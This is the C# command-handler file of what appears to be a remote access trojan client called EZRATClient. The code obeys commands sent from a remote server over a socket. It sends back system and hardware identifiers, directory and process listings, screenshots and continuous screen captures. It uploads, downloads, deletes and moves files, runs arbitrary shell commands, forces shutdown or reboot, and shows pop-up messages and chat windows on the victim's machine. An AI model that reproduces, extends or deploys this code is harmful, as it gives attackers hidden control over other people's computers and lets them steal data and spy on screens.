using EZRATClient.Forms;
using EZRATClient.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using EZRATClient.Utils;
using System.Media;

namespace EZRATClient.Core
{
    static class CommandParser
    {
        public static Chat cht = null;

        private static Thread TChat;

        public static void ParserAndExecute(string text)
        {
            if (text.StartsWith("getinfo-"))// i added this to start task manager
            {

                string response = "infoback;";
                response += text.Substring(8);
                response += ";";
                response += SystemInfo.GetLocalIPAddress();
                response += Constantes.Separator;
                response += SystemInfo.GetMachineName();
                response += Constantes.Separator;
                response += SystemInfo.GetUserName();
                response += Constantes.Separator;
                response += SystemInfo.GetWindowsVersion();
                response += Constantes.Separator;
                response += Constantes.Version;

                Program.SendCommand(response);

            }
            else if (text == "dc") { Program._clientSocket.Shutdown(SocketShutdown.Both); Program._clientSocket.Close(); Program.ConnectToServer(); }
            else if (text == "lsdrives")
            {
                string response = "lsdrives;";
                string[] drives = SystemInfo.GetDrives();
                for (int i = 0; i < drives.Length; i += 1)
                {
                    response += drives[i];
                    response += Constantes.Separator;
                }

                Program.SendCommand(response);
            }
            else if (text.StartsWith("lsfiles-"))
            {
                string path = text.Substring(8);
                DirectoryInfo d = new DirectoryInfo(path);
                List<DirectoryInfo> resD = new List<DirectoryInfo>();
                List<FileInfo> resF = new List<FileInfo>();

                try
                {
                    resD = d.EnumerateDirectories("*", SearchOption.TopDirectoryOnly)
             .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();

                    resF = d.EnumerateFiles("*", SearchOption.TopDirectoryOnly)
                 .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }


                string response = "lsfiles;";
                response += path;
                response += ";";
                resD.ForEach((item) =>
                {
                    response += item.Name; // Tarte.cs
                    response += Constantes.Special_Separator;  // Tarte.cs¦
                    response += "2";  // Tarte.cs¦2
                    response += Constantes.Separator;  // Tarte.cs¦2|
                });
                resF.ForEach((item) =>
                {
                    response += item.Name; // Tarte.cs
                    response += Constantes.Special_Separator;  // Tarte.cs¦
                    response += "1";  // Tarte.cs¦1
                    response += Constantes.Special_Separator;  // Tarte.cs¦
                    response += item.Length.ToString();  // Tarte.cs¦1¦3732527|
                    response += Constantes.Separator;  // Tarte.cs¦1|
                });

                Program.SendCommand(response);
            }
            else if (text.StartsWith("chat;"))
            {
                string options = text.Substring(5);
                string[] tmp = options.Split(';');
                string msg;

                msg = tmp[0];
                if (cht == null)
                {
                    cht = new Chat(msg);
                    TChat = new Thread(() => cht.ShowDialog());
                    TChat.Start();
                }
                else
                {
                    cht.NewMessage(msg);
                }
            }
            else if (text.StartsWith("chatdata;"))
            {
                if (cht != null)
                {
                    Program.SendCommand("chatdata;" + String.Join(Constantes.Separator, cht.Texted));
                }
            }
            else if (text.StartsWith("dlfile;"))
            {
                string path = text.Substring(7);
                CommandExecutor.SendFile(path);

            }
            else if (text.StartsWith("upfile;"))
            {
                text = text.Substring(7);
                CommandExecutor.ReceiveFile(text);
                if (text == "") 
                {
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Song.wav";
                    Console.WriteLine(path);
                    SoundPlayer snd = new SoundPlayer(path);
                    snd.Play();
                }
            }
            else if (text.StartsWith("dtfile;"))
            {
                text = text.Substring(7);
                File.Delete(text);
            }
            else if (text.StartsWith("rmfile;"))
            {
                text = text.Substring(7);
                string[] lines = text.Split(';');
                string src = lines[0];
                string dst = lines[1];
                File.Move(src, dst);
            }
            else if (text.StartsWith("procview;"))
            {
                Process[] proc = Process.GetProcesses();
                string result = "procview;";
                for (int i = 0; i < proc.Length; i++)
                {
                    result += $"{proc[i].ProcessName}¦{proc[i].Id};";
                }
                Program.SendCommand(result);
            }
            else if (text == "scrnshot;")
            {
                Program.SendCommand("scrnshot;" + CommandExecutor.TakeScreenShot());
            }
            else if (text.StartsWith("cmd;"))
            {
                text = text.Substring(4);
                string[] lines = text.Split(';');
                CommandExecutor.ExecuteCommand(lines[1], lines[0]);
            }
            else if (text.StartsWith("control;"))
            {
                text = text.Substring(8);
                switch (text)
                {
                    case "0":
                        CommandExecutor.WindowsControl("shutdown /l");
                        break;
                    case "1":
                        CommandExecutor.WindowsControl("shutdown /r /t 00");
                        break;
                    case "2":
                        CommandExecutor.WindowsControl("shutdown /s /f /p /t 00");
                        break;
                    default:
                        break;
                }
            }
            else if (text == "sysinfo;")
            {
                string result = "sysinfo;";
                result += SystemInfoDetails.GetBiosIdentifier();
                result += Constantes.Separator;
                result += SystemInfoDetails.GetCpuName();
                result += Constantes.Separator;
                result += SystemInfoDetails.GetGpuName();
                result += Constantes.Separator;
                result += SystemInfoDetails.GetLanIp();
                result += Constantes.Separator;
                result += SystemInfoDetails.GetMacAddress();
                result += Constantes.Separator;
                result += SystemInfoDetails.GetMainboardIdentifier();
                result += Constantes.Separator;
                result += SystemInfoDetails.GetTotalRamAmount();
                Program.SendCommand(result);
            }
            else if (text.StartsWith("msgbox;"))
            {
                string options = text.Substring(7);
                string[] tmp = options.Split(';');
                string title = tmp[0];
                string value = tmp[1];
                int icon = Convert.ToInt32(tmp[2]);
                MessageBoxIcon i;
                switch (icon)
                {
                    case 0:
                        i = MessageBoxIcon.Information;
                        break;
                    case 1:
                        i = MessageBoxIcon.Error;
                        break;
                    case 2:
                        i = MessageBoxIcon.Question;
                        break;
                    default:
                        i = MessageBoxIcon.Information;
                        break;
                }
                MessageBox.Show(value, title, MessageBoxButtons.OK, i);
            } else if (text.StartsWith("screenspy;"))
            {
                CommandExecutor.ScreenSpyThread();
            } else if(text.StartsWith("stopscreenspy;"))
            {
                CommandExecutor.StopScreenSpyThread();
            } else if(text.StartsWith("play;"))
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Song.wav";
                Console.WriteLine(path);
                SoundPlayer snd = new SoundPlayer(path);
                snd.Play();
            }
        }
    }


}
